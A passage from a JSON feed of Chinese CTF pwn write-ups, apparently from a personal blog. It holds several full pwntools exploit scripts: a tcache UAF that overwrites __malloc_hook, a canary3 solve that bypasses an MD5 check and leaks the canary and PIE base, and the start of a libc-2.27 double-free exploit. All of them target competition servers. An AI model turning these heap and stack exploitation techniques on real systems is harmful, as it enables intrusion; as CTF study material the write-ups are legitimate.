punctuation\">.</span>path<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#本题没有将栈上保存的变量操作后清0，而是在下一次操作时更新，更新失败时导致uaf</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#此时栈上保存了该地址</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xd0</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#此时ptr_list[0]=0xd0</span>\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#ptr_list[1]=0xd0 判断失败不更新指针</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#ptr_list[1]=0xd0 判断失败不更新指针</span>\n<span class=\"token comment\">#填满tcache</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xc0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#此时ptr_list[1]=0xc0</span>\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#ptr_list[1]=0xc0 判断失败不更新指针</span>\n\n__malloc_hook <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">224</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"__malloc_hook\"</span><span class=\"token punctuation\">,</span>__malloc_hook<span class=\"token punctuation\">)</span>\n\nlibc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"__malloc_hook\"</span><span class=\"token punctuation\">]</span>\nogg <span class=\"token operator\">=</span> one_gad<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>address\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>__malloc_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#常规tcache循环指针利用</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>ogg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   realNoOutput.py\n@Time    :   2021/08/01 09:19:35\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"canary3\"><a class=\"markdownIt-Anchor\" href=\"#canary3\">#</a> canary3</h1>\n<p>又是一道跟 md5 沾点的题目，阅读下面代码可以知道 s 存放了我们要输入的值，s2 存放了要比对的 md5 值，其中如果我们输入的值长度刚好为 0x20 的话将会将 s2 的值覆盖为 \\x00 开头，我们知道 strcmp 是会被 \\x00 截断的，此时只需要让我们输入的值的 md5 也为 \\x00 开头，这样就可以绕过检查。</p>\n<p><img src=\"/CTF/%E8%BF%91%E6%9C%9FPwn%E9%A2%98/image-20210809161517002.png\" alt=\"image-20210809161517002\"></p>\n<p>网上偷了个脚本</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">import</span> hashlib\n\n\n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    md5 <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    key <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>\n    md5<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span>\n    res <span class=\"token operator\">=</span> md5<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"00\"</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"find: \"</span><span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span> \n        <span class=\"token keyword\">break</span>\n</code></pre>\n<p>由于程序自带后门，那么接下来考虑的是如何泄露基地址 (程序开了 pie)，通过动态调试可以发现在用户的输入下面刚好存放了带有程序基地址的地方，我们覆盖其上面就可以将它带出来，canary 同理，之后哦 ret2text</p>\n<p><img src=\"/CTF/%E8%BF%91%E6%9C%9FPwn%E9%A2%98/8.png\" alt=\"img\"></p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\">#context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./canary3'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'node4.buuoj.cn'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'25498'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>progress<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'3.exit'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\none_gad <span class=\"token operator\">=</span> one_gadget<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#本题可以将MD5前一个字节覆盖成\\x00而绕过检查，同时也需要将输入的md5值前一个字节为\\x00</span>\n\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\"username:\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"admin\\x00\"</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"gB\"</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#md5之后可以以00开头</span>\n\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">\"password:\"</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token comment\">#注意到栈上保存了程序text段的地址</span>\ncmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x7</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"b\"</span>\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">\"input:\"</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n\ncmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\nru<span class=\"token punctuation\">(</span><span class=\"token string\">\"aaab\"</span><span class=\"token punctuation\">)</span>\npie_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xa20</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"pie_addr\"</span><span class=\"token punctuation\">,</span>pie_addr<span class=\"token punctuation\">)</span>\n\n\ncmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"b\"</span>\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">\"input:\"</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n\ncmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">\"aaab\"</span><span class=\"token punctuation\">)</span>\ncanary <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"canary\"</span><span class=\"token punctuation\">,</span>canary<span class=\"token punctuation\">)</span>\n\nbackdoor <span class=\"token operator\">=</span> pie_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x00000000000239F</span>\ncmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>backdoor<span class=\"token punctuation\">)</span>\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">\"input:\"</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\ncmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   canary3.py\n@Time    :   2021/08/05 10:39:49\n@Author  :   Niyah \n'''</span></code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "堆",
                "BUUCTF",
                "UAF"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E4%B8%83%E6%9C%88PWNHUB%E5%85%AC%E5%BC%80%E8%B5%9B/",
            "url": "http://niyah.cn/CTF/%E4%B8%83%E6%9C%88PWNHUB%E5%85%AC%E5%BC%80%E8%B5%9B/",
            "title": "七月PWNHUB公开赛",
            "date_published": "2021-07-06T02:10:27.000Z",
            "content_html": "<p>比较常规的题目</p>\n<a id=\"more\"></a>\n<h1 id=\"mynote\"><a class=\"markdownIt-Anchor\" href=\"#mynote\">#</a> Mynote</h1>\n<p>Libc-2.27.so 下的 uaf，而且是有 tcache double free 的版本，利用起来比较简单，程序没有给 edit</p>\n<p>将一个大于 fastbin 的堆块连续 free 7 次将 tcache 填满，之后再 free 一个该大小的堆块就可以泄露出 libc 地址</p>\n<p>之后的利用很简单，直接打 free_hook 就行</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \n<span class=\"token keyword\">import</span> galatea \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./My_note'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./My_note'</span><span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./libc-2.27.so\"</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'47.99.38.177'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'10001'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n    pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>choice<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token operator\">=</span><span class=\"token string\">\"aaa\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\none_gad <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x4f2c5</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4f322</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x10a38c</span><span class=\"token punctuation\">]</span>\n\nadd<span 